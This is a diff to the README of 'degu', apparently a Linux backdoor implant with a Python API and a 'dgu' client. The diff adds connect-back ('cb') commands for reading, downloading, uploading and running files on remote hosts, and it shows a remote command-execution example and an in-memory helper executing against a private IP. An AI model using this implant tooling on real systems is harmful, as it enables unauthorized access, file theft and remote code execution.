@@ -6,7 +6,9 @@ Python API is still in early dev, library use std python3 lib, but dgu utility u
 
 ### Main API
 
-yet you can use main api :
+**degu.py** is the python module to interact with degu.so.
+Some examples
+You can use main api :
 
 ```
 #!/usr/bin/env python
@@ -37,12 +39,17 @@ aa=d.mem_exec("../helper/cb",b"DEGU 192.168.0.39 11111 ")
 
 ```
 Usage:
-    dgu bind  <rhost> <rport> read <rfile>
-    dgu bind  <rhost> <rport> download <rfile> <lfile>
-    dgu bind  <rhost> <rport> upload <lfile> <rfile>
-    dgu bind  <rhost> <rport> exe <lfile> <parameters>
+    dgu bind  <rhost> <rport>         read     <rfile>
+    dgu bind  <rhost> <rport>         download <rfile> <lfile>
+    dgu bind  <rhost> <rport>         upload   <lfile> <rfile>
+    dgu bind  <rhost> <rport>         exe      <lfile> <parameters>
+    dgu cb    <rhost> <lhost> <lport> read     <rfile>
+    dgu cb    <rhost> <lhost> <lport> download <rfile> <lfile>
+    dgu cb    <rhost> <lhost> <lport> upload   <lfile> <rfile>
+    dgu cb    <rhost> <lhost> <lport> exe      <lfile> <parameters>
     dgu ghost <rhost> <cmd>
     dgu keygen
+    dgu getpub
 
 Examples:
 
@@ -77,4 +84,3 @@ $ dgu ghost 192.168.0.49 "touch /tmp/pwneeee"
 [   DEBUG  18:58.45][degu ]: executing : b'touch /tmp/pwneeee'
 ```
 
-[![asciicast](https://asciinema.org/a/Lwt1Ynp1v0m96r55hXvcVC1uT.svg)](https://asciinema.org/a/Lwt1Ynp1v0m96r55hXvcVC1uT)
